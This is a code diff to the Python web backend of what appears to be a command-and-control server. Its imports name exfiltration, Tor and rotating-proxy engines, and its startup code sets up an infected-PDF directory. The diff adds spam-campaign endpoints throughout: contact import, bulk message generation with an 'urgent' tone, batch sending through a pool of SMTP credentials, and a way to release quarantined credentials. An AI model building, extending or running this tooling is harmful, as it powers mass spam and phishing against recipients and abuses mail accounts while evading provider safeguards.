@@ -39,6 +39,7 @@ from src.c2_server.exfil import exfil_engine
 from src.c2_server.tor import tor_engine
 from src.c2_server.rotating_proxy import rotating_proxy_engine
 from src.c2_server.tool_engine import tool_engine, TOOLS
+from src.c2_server.spammer import spammer_engine
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
 logger = logging.getLogger("c2")
@@ -1876,6 +1877,112 @@ async def tools_cancel(execution_id: int):
     return {"status": "cancelled" if ok else "not_found"}
 
 
+# ── Spammer ──────────────────────────────────────────────────────────────
+
+@app.get("/api/spammer/status")
+async def spammer_status():
+    await spammer_engine.tick()
+    return spammer_engine.get_status()
+
+
+@app.get("/api/spammer/activity")
+async def spammer_activity():
+    return {"log": await spammer_engine.get_activity_log()}
+
+
+@app.get("/api/spammer/ab-report")
+async def spammer_ab_report(campaign_id: str = None):
+    return await spammer_engine.get_ab_report(campaign_id)
+
+
+@app.post("/api/spammer/import-contacts")
+async def spammer_import_contacts(data: dict = Body(...)):
+    contacts = data.get("contacts", [])
+    if not contacts:
+        return {"status": "error", "message": "No contacts provided"}
+    count = await spammer_engine.ingest_contacts(contacts)
+    await broadcast(await build_payload())
+    await c2_server._push_event({"timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), "type": "spammer", "payload": {"action": "import", "count": count}})
+    return {"status": "success", "imported": count}
+
+
+@app.post("/api/spammer/create-campaign")
+async def spammer_create_campaign(data: dict = Body(...)):
+    name = data.get("name", f"Campaign-{random.randint(1000, 9999)}")
+    template_id = data.get("template_id", "product_launch")
+    tone = data.get("tone", "URGENT_TONE")
+    cid = await spammer_engine.create_campaign(name, template_id, tone)
+    await broadcast(await build_payload())
+    await c2_server._push_event({"timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), "type": "spammer", "payload": {"action": "campaign_created", "name": name, "id": cid}})
+    return {"status": "success", "campaign_id": cid}
+
+
+@app.post("/api/spammer/generate")
+async def spammer_generate(data: dict = Body(...)):
+    count = data.get("count", 10)
+    generated = await spammer_engine.generate_bulk(count)
+    await broadcast(await build_payload())
+    return {"status": "success", "generated": generated}
+
+
+@app.post("/api/spammer/start")
+async def spammer_start(data: dict = Body(...)):
+    batch_size = data.get("batch_size", 5)
+    total = data.get("total", None)
+    asyncio.create_task(spammer_engine.start_sending(batch_size, total))
+    logger.info(f"[SPAMMER] Campaign started — batch={batch_size}")
+    await c2_server._push_event({"timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), "type": "spammer", "payload": {"action": "started"}})
+    await broadcast(await build_payload())
+    return {"status": "success", "message": "Campaign started"}
+
+
+@app.post("/api/spammer/stop")
+async def spammer_stop():
+    spammer_engine.stop()
+    logger.info("[SPAMMER] Campaign stopped")
+    await c2_server._push_event({"timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), "type": "spammer", "payload": {"action": "stopped"}})
+    await broadcast(await build_payload())
+    return {"status": "success"}
+
+
+@app.post("/api/spammer/set-tone")
+async def spammer_set_tone(data: dict = Body(...)):
+    tone = data.get("tone", "URGENT_TONE")
+    await spammer_engine.set_tone(tone)
+    return {"status": "success", "tone": tone}
+
+
+@app.post("/api/spammer/set-template")
+async def spammer_set_template(data: dict = Body(...)):
+    template_id = data.get("template_id", "product_launch")
+    await spammer_engine.set_template(template_id)
+    return {"status": "success", "template": template_id}
+
+
+@app.post("/api/spammer/init-smtp")
+async def spammer_init_smtp(data: dict = Body(...)):
+    creds = data.get("credentials", None)
+    await spammer_engine.init_smtp_pool(creds)
+    return {"status": "success", "pool_size": len(spammer_engine.smtp_pool)}
+
+
+@app.post("/api/spammer/validate-auth")
+async def spammer_validate_auth(data: dict = Body(...)):
+    host = data.get("host", "")
+    for c in spammer_engine.smtp_pool:
+        if c["host"] == host:
+            result = await spammer_engine.validate_domain_auth(c)
+            return {"status": "success", "auth": result}
+    return {"status": "error", "message": f"Credential {host} not found"}
+
+
+@app.post("/api/spammer/unquarantine")
+async def spammer_unquarantine(data: dict = Body(...)):
+    host = data.get("host", "")
+    ok = await spammer_engine.unquarantine_credential(host)
+    return {"status": "success" if ok else "error", "unquarantined": ok}
+
+
 # ── Serve frontend static files ─────────────────────────────────────────
 dist_dir = os.path.abspath("dist")
 if os.path.isdir(dist_dir):
@@ -1917,6 +2024,16 @@ async def ip_lookup(fields: str = "query", request: Request = None):
         return r.json()
 
 
+@app.get("/api/debug-headers")
+async def debug_headers(request: Request):
+    """Debug endpoint to see what headers Railway passes."""
+    return {
+        "headers": dict(request.headers),
+        "client_host": request.client.host if request.client else None,
+        "client_port": request.client.port if request.client else None,
+    }
+
+
 # ── Startup ───────────────────────────────────────────────────────────────
 
 @app.on_event("startup")
@@ -1925,6 +2042,9 @@ async def startup():
     for dir_path in [PDF_BASE_DIR, INFECTED_PDF_DIR]:
         os.makedirs(dir_path, exist_ok=True)
     await ai_brain.start()
+    # Initialize spammer engine schema
+    await spammer_engine._ensure_schema()
+    logger.info("Spammer engine schema ensured")
     # Restore preferred LLM provider from persistent memory
     preferred = await ai_brain.memory.get("preferred_llm_provider", "")
     if preferred:
